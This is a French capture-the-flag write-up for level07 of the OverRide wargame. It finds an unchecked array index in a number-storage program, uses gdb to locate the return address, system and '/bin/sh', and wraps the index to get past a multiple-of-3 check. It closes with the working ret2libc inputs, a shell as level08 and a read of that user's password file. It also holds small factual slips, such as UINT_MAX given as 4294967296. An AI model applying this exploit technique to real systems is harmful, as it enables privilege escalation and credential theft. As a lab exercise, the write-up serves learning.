En de-compilant le programme on ce rend compte que le programme store des nombres dans un tableau de 100 index sans protection. C'est a dire que l'on peux store des index au dela du tableau.

Vue que le tableau est situer sur la stack grace a lui on vas pouvoir overider le __return__ de la fonction __main__ pour executer un __system("/bin/sh")__.

---

## Fonctionnement du code:

Le programme est composer d'un __main__ et de deux fonctions: __read_number__ et __store_number__.

Main: clear l'environement et les args, puis attend un input pour lancer les fonction ascossier.

```c
int main(int argc, char **argv, char **envp) {
	int data[100] = {0};
	char command[20] = {0};
	int ret = 0;
	int i;
	for (i = 0; argv[i] != NULL; i++) {
		memset(argv[i], 0, strlen(argv[i]));
	}
	for (i = 0; envp[i] != NULL; i++) {
		memset(envp[i], 0, strlen(envp[i]));
	}
	puts("----------------------------------------------------");
	puts(" Welcome to wil's crappy number storage service! ");
	puts("----------------------------------------------------");
	puts(" Commands: ");
	puts(" store - store a number into the data storage ");
	puts(" read - read a number from the data storage ");
	puts(" quit - exit the program ");
	puts("----------------------------------------------------");
	puts(" wil has reserved some storage :> ");
	puts("----------------------------------------------------");
	while (1) {
		printf("Input command: ");
		ret = 1;
		if (fgets(command, sizeof(command), stdin) == NULL)
			break;
		size_t len = strlen(command);
		if (len > 0 && command[len - 1] == '\n')
			command[len - 1] = '\0';
		if (strncmp(command, "store", 5) == 0) {
			ret = store_number(data);
		} else if (strncmp(command, "read", 4) == 0) {
			ret = read_number(data);
		} else if (strncmp(command, "quit", 4) == 0) {
		break;
		}
		if (ret)
			printf(" Failed to do %s command\n", command);
		else
			printf(" Completed %s command successfully\n", command);
		memset(command, 0, sizeof(command));
	}
	return 0;
}
```

Read_number: Lis la valeur dans le tableau a un l'index donner.

```c
int read_number(int *data) {
	int index;
	printf(" Index: ");
	index = get_unum();
	printf(" Number at data[%u] is %u\n", (unsigned int)index, (unsigned int)data[index]);
	return 0;
}
```

Store_number: store dans le tableau un __int__ (4 octets) a un index donner.
> Attention si l'index et un multiple de 3 le tableau ne store pas la value.
 
```c
int store_number(int *data) {
	unsigned int number, index;
	printf(" Number: ");
	number = get_unum();
	printf(" Index: ");
	index = get_unum();
	/* Si l'index est un multiple de 3 ou si le high-byte du nombre vaut 183 */
	if ((index % 3 == 0) || (((number >> 8) & 0xFF) == 183)) {
		puts(" *** ERROR! ***");
		puts(" This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	} 
	else {
		data[index] = number;
		return 0;
	}
}
```

--- 
## Exploit:

En utilisant __gdb__ nous allons chercher l'offset entre le __tableau__ et le __return__ du main pour pouvoir overrider l'adresse de celui-ci.

Nous allons ensuite chercher l'adresse de la fonction __system__ et de la string __"/bin/sh"__ qui son situer dans la memoir du programe pour les placer dans le __return__.

---

#### offset du tableau et du return: 

- Recuperation de l'adresse du tableau
- Recuperation de l'adresse du return
- difference entre les deux.

Execution:

Pour trouver l'adresse du __tableau__, dans __gdb__ on vas placer un breakpoint sur la fonction __read_number__, lancer le programme et lire __edp__ qui est le parametre passer a la fonction (parametre qui est le tableau).

```bash
level07@OverRide:~$ gdb ./level07 
(gdb) b read_number 
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8
0xffffd520:	0xffffd544
(gdb)
```

On trouve donc l'adresse ==0xffffd544== pour l'adresse du tableau.

Pour recuperer l'adresse du __return__, on vas placer un breakpoint sur l'appel de la fonction __read_number__ dans le __main__.

```bash
(gdb) disas main
Dump of assembler code for function main:
   [...]
   0x0804892b <+520>:	call   0x80486d7 <read_number>
   [...]
End of assembler dump.
(gdb) b *main+520
Breakpoint 2 at 0x804892b
(gdb)
```

On relance le programe et quand on arrive sur le breakpoint on execute __"i f"__ pour recuper la valeur de __eip__ (qui est l'adresse du return)

```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 2, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c

```

On trouve donc l'adresse ==0xffffd70c==.

avec ceci on calcule l'offset:
> [addr return] - [addr tab] / 4
```bash
(0xffffd70c - 0xffffd544) / 4 = 0x72 soit 114
```

### recuperation de system et de "/bin/sh":

Pour recuperer l'adresse de __system__ il sufit que le prgramme troune dans __gdb__ avec un breakpoint et executer la commande __"info func system"__.

```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 2, 0x0804892b in main ()
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

```

On obtien donc ==0xf7e6aed0==.

Pour l'adresse de __"/bin/sh"__, il faut aller la chercher dans les protocol dans __gdb__.

```bash
(gdb) info proc map
process 2525
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

On obtient donc ==0xf7f897ec==.

### Mise en execution:

Avec tout ca, on vas override l'adresse du __return__ du main situer a l'index __114__ du tableau pour excuter un __system("/bin/sh")__.

cependant il nous reste un probleme, 114 et un multiple de 3 du coup nous ne pouvont pas passer cette index a __store_number__.

pour bypass ca pour la overflow l'index avec un nombre tres grand pour qu'il revienne sur __114__.

On sait qu'__index__ et un __unsigned int__ on connait donc UINT_MAX = 4294967296.

On divise ce nombre / 4 et on lui ajoute 114 et INCROYABLE ca fonctionne.

> Index: 1073741938

Il nous reste plus qu'a override et convertire l'adresse de __system__ et de __"bin/sh"__ en decimal.

On decale l'index de __"/bin/sh"__ de deux (116) parce qu'une adresse fait (8 octets) et le tableau stock des __int__ soit 4 octets.

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

On execute ensuite:

```bash
cat /home/users/level08/.pass
```